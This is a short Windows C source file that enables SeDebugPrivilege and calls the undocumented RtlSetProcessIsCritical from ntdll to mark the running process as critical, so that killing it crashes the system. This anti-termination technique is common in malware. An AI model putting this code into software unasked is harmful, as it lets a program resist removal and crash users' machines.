#include "definition.h"

typedef long (WINAPI* RtlSetProcessIsCritical) (IN BOOLEAN newValue, OUT BOOLEAN* oldValue, IN BOOLEAN criticalBreak);

BOOL EnablePrivilege(LPCWSTR privilege) {
	if(!privilege) {
		return FALSE;
	}

	HANDLE token = NULL;
	LUID identifier;
	TOKEN_PRIVILEGES privileges = {0};

	if(!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &token)) {
		return FALSE;
	}

	if(!LookupPrivilegeValueW(NULL, privilege, &identifier)) {
		return FALSE;
	}

	privileges.PrivilegeCount = 1;
	privileges.Privileges[0].Luid = identifier;
	privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	BOOL success = AdjustTokenPrivileges(token, FALSE, &privileges, sizeof(privileges), NULL, NULL);
	CloseHandle(token);
	return success;
}

BOOL ProtectProcess() {
	if(!EnablePrivilege(SE_DEBUG_NAME)) {
		return FALSE;
	}

	HMODULE handle = LoadLibraryW(L"ntdll.dll");

	if(!handle) {
		return FALSE;
	}

	RtlSetProcessIsCritical SetProcessIsCritical = (RtlSetProcessIsCritical) GetProcAddress(handle, "RtlSetProcessIsCritical");

	if(!SetProcessIsCritical) {
		return FALSE;
	}

	SetProcessIsCritical(TRUE, NULL, FALSE);
	return TRUE;
}
